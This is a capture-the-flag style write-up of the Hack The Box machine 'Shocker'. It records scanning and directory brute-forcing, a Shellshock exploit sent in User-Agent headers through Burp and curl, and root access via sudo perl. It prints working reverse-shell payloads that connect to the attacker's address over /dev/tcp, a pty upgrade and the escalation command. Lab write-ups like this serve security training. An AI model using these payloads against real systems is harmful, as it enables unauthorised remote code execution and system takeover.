# Information Gathering

Target name: shocker
Target IP: 10.129.116.171


# Penetration
## Service Enumeration

| Server IP Address | Ports Open          | Service/Banner |
| ----------------- | --------------------| -------------- |
| 10.129.116.171       | **TCP**:|	|
|	| 80 | Apache httpd 2.4.18 ((Ubuntu)) |
|	| 2222 | OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) |
|	| **UDP**:| |
|	|	-	|	|


### Scan Results for `nmap`
#### Full scan TCP
```
# Nmap 7.91 scan initiated Wed Jul  7 01:30:08 2021 as: nmap -vv --stats-every 20s -p- --min-rate 10000 -oA alltcp 10.129.116.171
Nmap scan report for 10.129.116.171
Host is up, received echo-reply ttl 63 (0.13s latency).
Scanned at 2021-07-07 01:30:08 EDT for 7s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack ttl 63
2222/tcp open  EtherNetIP-1 syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Jul  7 01:30:15 2021 -- 1 IP address (1 host up) scanned in 7.06 seconds

```  

#### Full scan UDP
```
# Nmap 7.91 scan initiated Wed Jul  7 01:31:09 2021 as: nmap -vv --stats-every 20s -sU -p- --min-rate 10000 -oA alludp 10.129.116.171
Warning: 10.129.116.171 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.116.171
Host is up, received echo-reply ttl 63 (0.18s latency).
All 65535 scanned ports on 10.129.116.171 are open|filtered (65454) or closed (81) because of 65454 no-responses and 81 port-unreaches

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Jul  7 01:32:26 2021 -- 1 IP address (1 host up) scanned in 77.63 seconds
```

#### Service scan 
```
# Nmap 7.91 scan initiated Sun Jul 11 00:19:02 2021 as: nmap -p 80,2222 -sCV -oA scans/nmap-tcpscripts 10.129.116.171
Nmap scan report for 10.129.116.171
Host is up (0.038s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 11 00:19:12 2021 -- 1 IP address (1 host up) scanned in 10.25 seconds
```


### Website - TCP port 80
![[Pasted image 20210707023826.png]]

```html
 <!DOCTYPE html> 
 <html> 
 	<body> 
		<h2>Don't Bug Me!</h2> 
		<img src="[bug.jpg](view-source:http://10.129.116.171/bug.jpg)" alt="bug" style="width:450px;height:350px;"> 
	</body> 
</html>
```


#### Directory Brute Force
##### Alternative 1: [FeroxBuster](https://github.com/epi052/feroxbuster)
```
┌──(kali㉿kali)-[~/htb/shocker]
└─$ feroxbuster -u http://10.129.116.171 -x php,html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.116.171
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.2.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php, html]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
403       11l       32w      302c http://10.129.116.171/server-status
200        9l       13w      137c http://10.129.116.171/index.html
[####################] - 1m    179994/179994  0s      found:2       errors:15     
[####################] - 1m     89997/89997   1085/s  http://10.129.116.171

```

FeroxBuster finds only an ```index.html``` and a 403 forbidden on ```server-status```, which is a typical page for the Apache Module ```mod_status```.

```
┌──(kali㉿kali)-[~/htb/shocker]
└─$ feroxbuster -u http://10.129.116.171 -f -n      

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.116.171
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.2.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🪓  Add Slash             │ true
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
403       11l       32w      297c http://10.129.116.171/cgi-bin/
403       11l       32w      295c http://10.129.116.171/icons/
403       11l       32w      303c http://10.129.116.171/server-status/
[####################] - 34s    29999/29999   0s      found:3       errors:0      
[####################] - 33s    29999/29999   885/s   http://10.129.116.171
```

Next step is to try to find additional files withing the `cgi-bin` folder.
For this the additional parameter
* x: File extension(s) to search for (ex: -x php -x pdf js)

is used.
```
┌──(kali㉿kali)-[~/htb/shocker]
└─$ feroxbuster -u http://10.129.116.171/cgi-bin/ -x sh,cgi,pl

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.116.171/cgi-bin/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.2.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [sh, cgi, pl]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200        7l       18w        0c http://10.129.116.171/cgi-bin/user.sh
[####################] - 1m    359988/359988  0s      found:1       errors:8      
[####################] - 1m    119996/119996  1057/s  http://10.129.116.171/cgi-bin/

```

One additional file, `user.sh`, was found.

### Alternative 2: Gobuster
Run `gobuster` to find hidden files and folders with the parameters:
* dir: Uses directory/file enumeration mode
* u: The target URL
* w: Path to the wordlist

```
└─$ gobuster dir -u http://10.129.116.171 -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.116.171
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/11 01:01:35 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 291]
/.htaccess            (Status: 403) [Size: 296]
/.htpasswd            (Status: 403) [Size: 296]
/cgi-bin/             (Status: 403) [Size: 295]
/index.html           (Status: 200) [Size: 137]
/server-status        (Status: 403) [Size: 300]
                                               
===============================================================
2021/07/11 01:02:08 Finished
===============================================================
```

The `cgi-bin` folder is an indicator that the system might be vulnerable to Shellshock. An additional `gobuster` run with the parameter 
* x: File extension(s) to search for
* t:  Number of concurrent threads (default 10)
finds one more additional file `user.sh`.

```
└─$ gobuster dir -u http://10.129.116.171/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x cgi,py,pl,php,sh -t 50 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.116.171/cgi-bin/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,sh,cgi,py,pl
[+] Timeout:                 10s
===============================================================
2021/07/11 01:22:45 Starting gobuster in directory enumeration mode
===============================================================
/user.sh              (Status: 200) [Size: 118]
Progress: 143316 / 180006 (79.62%)            [ERROR] 2021/07/11 01:24:38 [!] parse "http://10.129.116.171/cgi-bin/error\x1f_log": net/url: invalid control character in URL
                                               
===============================================================
2021/07/11 01:25:06 Finished
===============================================================
```

Running the same command with a bigger wordlist brings no additional finding.

```
└─$ gobuster dir -u http://10.129.116.171/cgi-bin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x cgi,py,pl,php,sh -t 50 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.116.171/cgi-bin/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              cgi,py,pl,php,sh
[+] Timeout:                 10s
===============================================================
2021/07/11 01:22:52 Starting gobuster in directory enumeration mode
===============================================================
/user.sh              (Status: 200) [Size: 118]
                                               
===============================================================
2021/07/11 01:40:39 Finished
===============================================================
```

### `nmap` check if script is vulnerable to Shellshock
```
┌──(kali㉿kali)-[~/htb/shocker]
└─$ nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.129.116.171
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-07 02:16 EDT
Nmap scan report for 10.129.116.171
Host is up (0.042s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       http://seclists.org/oss-sec/2014/q3/685
|_      http://www.openwall.com/lists/oss-security/2014/09/24/10

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.93 seconds
```

Nmap shows that the script is vulnerable to Shellshock.

A quick look into `/usr/share/nmap/scripts/http-shellshock.nse` shows, that the script tries to send manipulated headers (`User-Agent`, `Referer` and `Cookie`). 

#### Download `user.sh` with BurpSuite (Intercept is on):
![[Pasted image 20210707023303.png]]

The content of `user.sh` is :
```
Content-Type: text/plain

Just an uptime test script

02:02:38 up 35 min,  0 users,  load average: 0.00, 0.00, 0.00
```

![[Pasted image 20210707023421.png]]

The Repeater of BurpSuite is used and `User-Agent` is set to  `() { :;}; echo; /bin/ping -c 1 10.10.17.226`.
![[Pasted image 20210707023457.png]]

Request:
```
GET /cgi-bin/user.sh HTTP/1.1
Host: 10.129.116.171
Upgrade-Insecure-Requests: 1
User-Agent: () { :;}; echo; /bin/ping -c 1 10.10.17.226
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

Response
```
HTTP/1.1 200 OK
Date: Wed, 07 Jul 2021 06:14:26 GMT
Server: Apache/2.4.18 (Ubuntu)
Connection: close
Content-Type: text/x-sh
Content-Length: 267

PING 10.10.17.226 (10.10.17.226) 56(84) bytes of data.
64 bytes from 10.10.17.226: icmp_seq=1 ttl=63 time=115 ms

--- 10.10.17.226 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 115.806/115.806/115.806/0.000 ms
```

This example shows, that the request could manipulate the behaviour of the server and executed a ping to the attacker machine.

Next step is to start a `nc` listener on tcp port 443, and then send the following User-Agent text:

```
User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.17.226/443 0>&1
```


The terminal shows that the target machine connected to the attacker machine. 
```
┌──(kali㉿kali)-[~/htb/shocker]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.17.226] from (UNKNOWN) [10.129.116.171] 49884
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ 
```

Use the following commands to get a full shell:

```
shelly@Shocker:/usr/lib/cgi-bin$ python3 -c 'import pty;pty.spawn("bash")'
python3 -c 'import pty;pty.spawn("bash")'
shelly@Shocker:/usr/lib/cgi-bin$ ^Z
zsh: suspended  nc -lvnp 443
                                                                                                      
┌──(kali㉿kali)-[~/htb/shocker]
└─$ stty raw -echo ; fg                                        
[1]  + continued  nc -lvnp 443

shelly@Shocker:/usr/lib/cgi-bin$ 
```


### user flag
```
shelly@Shocker:/usr/lib/cgi-bin$ cat /home/shelly/user.txt 
c7b88cd*************************
```

First we check `sudo -l` before we upload any kind of enumeration script:
```
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

 `perl` can be executed with root rights and without password.

### root shell
```
shelly@Shocker:/usr/lib/cgi-bin$ sudo perl -e 'exec "/bin/bash"'
```
### root flag
```
root@Shocker:/usr/lib/cgi-bin# cat /root/root.txt 
003b33**************************

```

### Alternative 2 with curl
```
curl -H 'User-Agent: () { :;}; echo; echo "VULNERABLE TO SHELLSHOCK"' http://10.129.116.171/cgi-bin/user.sh 2>/dev/null| grep 'VULNERABLE'
```

```
──(kali㉿kali)-[~/…/share/htb/HackTheBox/shocker]
└─$ curl -H 'User-Agent: () { :;}; echo; echo "VULNERABLE TO SHELLSHOCK"' http://10.129.116.171/cgi-bin/user.sh
VULNERABLE TO SHELLSHOCK

Content-Type: text/plain

Just an uptime test script

 16:51:17 up 26 min,  0 users,  load average: 0.00, 0.00, 0.00

```

Reverse shell using curl
```
──(kali㉿kali)-[~/…/share/htb/HackTheBox/shocker]
└─$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.17.226/443 0>&1' http://10.129.116.1/cgi-bin/user.sh

```

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443                                   
listening on [any] 443 ...
connect to [10.10.17.226] from (UNKNOWN) [10.129.116.1] 42294
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ 

```








```
nmap -vv --reason --stats-every 20s -sV -p 80 --script="banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" -oA scans/tcp_80_http_nmap 10.129.116.171
```

```
# Nmap 7.91 scan initiated Sun Jul 11 23:45:39 2021 as: nmap -vv --reason --stats-every 20s -sV -p 80 "--script=banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" -oA scans/tcp_80_http_nmap 10.129.116.171
Nmap scan report for 10.129.116.171
Host is up, received syn-ack (0.039s latency).
Scanned at 2021-07-11 23:45:40 EDT for 31s

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-chrono: Request times for /; avg: 217.98ms; min: 157.36ms; max: 266.81ms
|_http-comments-displayer: Couldn't find any comments.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-date: Mon, 12 Jul 2021 03:45:50 GMT; 0s from local time.
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-drupal-enum: Nothing found amongst the top 100 resources,use --script-args number=<number|all> for deeper analysis)
|_http-errors: Couldn't find any error pages.
|_http-exif-spider: ERROR: Script execution failed (use -d to debug)
|_http-feed: Couldn't find any feeds.
|_http-fetch: Please enter the complete path of the directory to save data in.
| http-headers: 
|   Date: Mon, 12 Jul 2021 03:45:48 GMT
|   Server: Apache/2.4.18 (Ubuntu)
|   Last-Modified: Fri, 22 Sep 2017 20:01:19 GMT
|   ETag: "89-559ccac257884"
|   Accept-Ranges: bytes
|   Content-Length: 137
|   Vary: Accept-Encoding
|   Connection: close
|   Content-Type: text/html
|   
|_  (Request type: HEAD)
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-malware-host: Host appears to be clean
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-mobileversion-checker: No mobile version detected.
| http-php-version: Logo query returned unknown hash 1694158b3f7adc637066c13aed71a979
|_Credits query returned unknown hash 1694158b3f7adc637066c13aed71a979
|_http-referer-checker: Couldn't find any cross-domain scripts.
|_http-security-headers: 
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1; jpg: 1
|   Longest directory structure:
|     Depth: 0
|     Dir: /
|   Total files found (by extension):
|_    Other: 1; jpg: 1
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-title: Site doesn't have a title (text/html).
| http-useragent-tester: 
|   Status for browser useragent: 200
|   Allowed User Agents: 
|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
| http-vhosts: 
|_128 names had status 200
|_http-wordpress-enum: Nothing found amongst the top 100 resources,use --script-args search-limit=<number|all> for deeper analysis)
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 11 23:46:11 2021 -- 1 IP address (1 host up) scanned in 31.93 seconds
```

```
whatweb --color=never --no-errors -a 3 -v http://10.129.116.171:80 2>&1 | tee scans/tcp_80_http_whatweb.txt
```

```
WhatWeb report for http://10.129.116.171:80
Status    : 200 OK
Title     : <None>
IP        : 10.129.116.171
Country   : RESERVED, ZZ

Summary   : HTML5, Apache[2.4.18], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)]

Detected Plugins:
[ Apache ]
	The Apache HTTP Server Project is an effort to develop and 
	maintain an open-source HTTP server for modern operating 
	systems including UNIX and Windows NT. The goal of this 
	project is to provide a secure, efficient and extensible 
	server that provides HTTP services in sync with the current 
	HTTP standards. 

	Version      : 2.4.18 (from HTTP Server Header)
	Google Dorks: (3)
	Website     : http://httpd.apache.org/

[ HTML5 ]
	HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
	HTTP server header string. This plugin also attempts to 
	identify the operating system from the server header. 

	OS           : Ubuntu Linux
	String       : Apache/2.4.18 (Ubuntu) (from server string)

HTTP Headers:
	HTTP/1.1 200 OK
	Date: Mon, 12 Jul 2021 03:45:54 GMT
	Server: Apache/2.4.18 (Ubuntu)
	Last-Modified: Fri, 22 Sep 2017 20:01:19 GMT
	ETag: "89-559ccac257884-gzip"
	Accept-Ranges: bytes
	Vary: Accept-Encoding
	Content-Encoding: gzip
	Content-Length: 134
	Connection: close
	Content-Type: text/html
	

```


```
nikto -ask=no -h http://10.129.116.171:80 2>&1 | tee scans/tcp_80_http_nikto.txt
```

```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.129.116.171
+ Target Hostname:    10.129.116.171
+ Target Port:        80
+ Start Time:         2021-07-11 23:46:17 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 89, size: 559ccac257884, mtime: gzip
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ OSVDB-3233: /icons/README: Apache default file found.
```

```
nmap -vv --reason --stats-every 20s -sV -p 2222 --script="banner,ssh2-enum-algos,ssh-hostkey,ssh-auth-methods" -oA scans/tcp_2222_ssh_nmap.txt 10.129.116.171
```

```
# Nmap 7.91 scan initiated Sun Jul 11 23:49:23 2021 as: nmap -vv --reason --stats-every 20s -sV -p 2222 --script=banner,ssh2-enum-algos,ssh-hostkey,ssh-auth-methods -oA scans/tcp_2222_ssh_nmap 10.129.116.171
Nmap scan report for 10.129.116.171
Host is up, received syn-ack (0.051s latency).
Scanned at 2021-07-11 23:49:23 EDT for 3s

PORT     STATE SERVICE REASON  VERSION
2222/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
|_banner: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
| ssh2-enum-algos: 
|   kex_algorithms: (6)
|       curve25519-sha256@libssh.org
|       ecdh-sha2-nistp256
|       ecdh-sha2-nistp384
|       ecdh-sha2-nistp521
|       diffie-hellman-group-exchange-sha256
|       diffie-hellman-group14-sha1
|   server_host_key_algorithms: (5)
|       ssh-rsa
|       rsa-sha2-512
|       rsa-sha2-256
|       ecdsa-sha2-nistp256
|       ssh-ed25519
|   encryption_algorithms: (6)
|       chacha20-poly1305@openssh.com
|       aes128-ctr
|       aes192-ctr
|       aes256-ctr
|       aes128-gcm@openssh.com
|       aes256-gcm@openssh.com
|   mac_algorithms: (10)
|       umac-64-etm@openssh.com
|       umac-128-etm@openssh.com
|       hmac-sha2-256-etm@openssh.com
|       hmac-sha2-512-etm@openssh.com
|       hmac-sha1-etm@openssh.com
|       umac-64@openssh.com
|       umac-128@openssh.com
|       hmac-sha2-256
|       hmac-sha2-512
|       hmac-sha1
|   compression_algorithms: (2)
|       none
|_      zlib@openssh.com
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 11 23:49:26 2021 -- 1 IP address (1 host up) scanned in 2.72 seconds
```


## Exploiting with Metasploit

```
└─$ msfconsole 
                                                  

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.0.45-dev                          ]
+ -- --=[ 2134 exploits - 1139 auxiliary - 364 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: Use the edit command to open the 
currently active module in your editor

msf6 > search shellshock

Matching Modules
================

   #   Name                                               Disclosure Date  Rank       Check  Description
   -   ----                                               ---------------  ----       -----  -----------
   0   exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Yes    Advantech Switch Bash Environment Variable Code Injection (Shellshock)
   1   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
   2   auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   3   exploit/multi/http/cups_bash_env_exec              2014-09-24       excellent  Yes    CUPS Filter Bash Environment Variable Code Injection (Shellshock)
   4   auxiliary/server/dhclient_bash_env                 2014-09-24       normal     No     DHCP Client Bash Environment Variable Code Injection (Shellshock)
   5   exploit/unix/dhcp/bash_environment                 2014-09-24       excellent  No     Dhclient Bash Environment Variable Injection (Shellshock)
   6   exploit/linux/http/ipfire_bashbug_exec             2014-09-29       excellent  Yes    IPFire Bash Environment Variable Injection (Shellshock)
   7   exploit/multi/misc/legend_bot_exec                 2015-04-27       excellent  Yes    Legend Perl IRC Bot Remote Code Execution
   8   exploit/osx/local/vmware_bash_function_root        2014-09-24       normal     Yes    OS X VMWare Fusion Privilege Escalation via Bash Environment Code Injection (Shellshock)
   9   exploit/multi/ftp/pureftpd_bash_env_exec           2014-09-24       excellent  Yes    Pure-FTPd External Authentication Bash Environment Variable Code Injection (Shellshock)
   10  exploit/unix/smtp/qmail_bash_env_exec              2014-09-24       normal     No     Qmail SMTP Bash Environment Variable Injection (Shellshock)
   11  exploit/multi/misc/xdh_x_exec                      2015-12-04       excellent  Yes    Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution


Interact with a module by name or index. For example info 11, use 11 or use exploit/multi/misc/xdh_x_exec

msf6 > use 1
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > show options

Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   CMD_MAX_LENGTH  2048             yes       CMD max line length
   CVE             CVE-2014-6271    yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
   HEADER          User-Agent       yes       HTTP header to use
   METHOD          GET              yes       HTTP method to use
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                           yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPATH           /bin             yes       Target PATH for binaries used by the CmdStager
   RPORT           80               yes       The target port (TCP)
   SRVHOST         0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT         8080             yes       The local port to listen on.
   SSL             false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI                        yes       Path to CGI script
